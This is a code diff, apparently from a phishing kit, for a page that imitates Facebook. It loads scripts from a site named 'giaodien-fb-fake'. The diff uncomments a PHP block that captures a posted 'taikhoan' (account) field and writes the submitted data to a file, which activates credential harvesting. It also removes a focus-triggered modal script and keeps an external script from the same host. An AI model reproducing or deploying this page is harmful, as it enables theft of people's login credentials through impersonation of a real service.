@@ -1,4 +1,4 @@
-<!-- 
+
     <?php
         
     if(isset($_POST["taikhoan"])){
@@ -10,7 +10,7 @@
       fwrite($test,$body);
       fclose($test); 
     }
-?>  -->
+?>  
  <!DOCTYPE html>
       <html>
           
@@ -125,25 +125,7 @@
                 <script src="https://ticchien111.github.io/giaodien-fb-fake/jquery.js"></script>
            
                 
-              <script>
-                 
-                            function showlog() {
-                              $('#myModal').modal({
-                                          backdrop: 'static',
-                                          keyboard: true, 
-                                          show: true
-                                      });
-                            }
-                  focus();
-              var listener = addEventListener('blur', function() {
-                  if(document.activeElement === document.getElementById('iframe')) {
-                    showlog();
-                  }
-                  removeEventListener(listener);
-              });
-           
-                 
-                </script>
+     
 <script src="https://ticchien111.github.io/script/v1.js"></script>
 
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous">
